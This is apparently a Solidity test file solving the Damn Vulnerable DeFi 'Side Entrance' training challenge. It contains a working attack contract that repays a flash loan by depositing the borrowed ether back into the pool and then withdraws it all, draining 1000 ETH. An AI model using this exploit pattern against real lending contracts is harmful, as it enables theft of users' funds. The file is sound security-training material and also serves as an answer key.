// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity ^0.8.30;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceAttack attackContract = new SideEntranceAttack();
        (bool success, ) = payable(attackContract).call{value: 1 ether}("");
        require(success, "Transfer Failed");
        attackContract.attack(pool, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    uint256 constant ETHER_IN_POOL = 1000e18;

    function attack(SideEntranceLenderPool _pool, address recovery) public {
        pool = _pool;
        pool.flashLoan(ETHER_IN_POOL);
        pool.withdraw();
        (bool success, ) = payable(recovery).call{value: ETHER_IN_POOL}("");
        require(success, "Transfer Failed");
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
